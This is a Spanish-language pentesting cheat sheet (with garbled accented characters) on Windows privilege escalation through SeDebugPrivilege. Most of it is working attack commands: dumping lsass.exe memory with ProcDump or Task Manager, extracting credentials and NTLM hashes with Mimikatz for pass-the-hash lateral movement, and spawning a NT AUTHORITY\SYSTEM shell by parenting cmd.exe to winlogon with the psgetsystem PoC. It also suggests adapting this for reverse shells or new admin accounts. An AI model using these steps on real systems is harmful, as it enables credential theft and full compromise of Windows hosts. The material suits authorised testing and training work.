
# üõ† Escalada de Privilegios con SeDebugPrivilege

## üß† ¬øQu√© es SeDebugPrivilege?

- Permite depurar procesos, incluyendo los protegidos por el sistema.
- Por defecto, lo tienen los **administradores locales**.
- Puede asignarse a otros usuarios v√≠a GPO.
- Da acceso a **componentes cr√≠ticos del sistema operativo**.
- Com√∫n en cuentas de **desarrolladores o t√©cnicos**.

---

## üîç Enumeraci√≥n y Contexto

- A veces se asigna a usuarios no administradores.
- No siempre se detecta con herramientas como **BloodHound**.
- Interesante si se capturan hashes NTLMv2 con **Responder** o **Inveigh**.

---

## üîß Verificar privilegios activos

```bash
whoami /priv
```

Buscar que `SeDebugPrivilege` est√© listado (aunque inicialmente puede estar deshabilitado).

---

## üì• Volcado de memoria con ProcDump

1. Usar [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump):
   ```bash
   procdump.exe -accepteula -ma lsass.exe lsass.dmp
   ```

2. Procesar con **Mimikatz**:
   ```bash
   sekurlsa::minidump lsass.dmp
   sekurlsa::logonPasswords
   ```

3. Obtener hashes NTLM y otros datos √∫tiles para **lateral movement** con **Pass-the-Hash**.

---

## üñ± Alternativa gr√°fica: Task Manager

1. Abrir Task Manager > pesta√±a *Details*.
2. Clic derecho sobre `lsass.exe` > *Create dump file*.
3. Descargar archivo `.dmp` y procesar con **Mimikatz** como arriba.

---

## üß¨ RCE como SYSTEM usando PowerShell

### Usar token del proceso SYSTEM:

1. Obtener PID de proceso SYSTEM:
   ```powershell
   tasklist | findstr winlogon
   ```

2. Ejecutar PoC:
   - Usar [psgetsystem](https://github.com/decoder-it/psgetsystem)
   ```powershell
   [MyProcess]::CreateProcessFromParent(612,"cmd.exe","")
   ```

3. Ver√°s una shell como **NT AUTHORITY\SYSTEM**.

---

## üîÅ Automatizar con `Get-Process`

```powershell
$pid = (Get-Process -Name winlogon).Id
[MyProcess]::CreateProcessFromParent($pid,"cmd.exe","")
```

---

## üí° Consideraciones

- Puedes modificar el PoC para ejecutar:
  - Reverse shells.
  - Agregar un nuevo usuario administrador.
- √ötil cuando:
  - No puedes cargar herramientas.
  - Tienes una **web shell** o **command injection**.
  - El volcado de `lsass` no contiene credenciales √∫tiles.

---

## üìå Buenas pr√°cticas

- Siempre ejecutar:
  ```mimikatz
  log
  ```
  antes de cualquier comando, para guardar la salida.
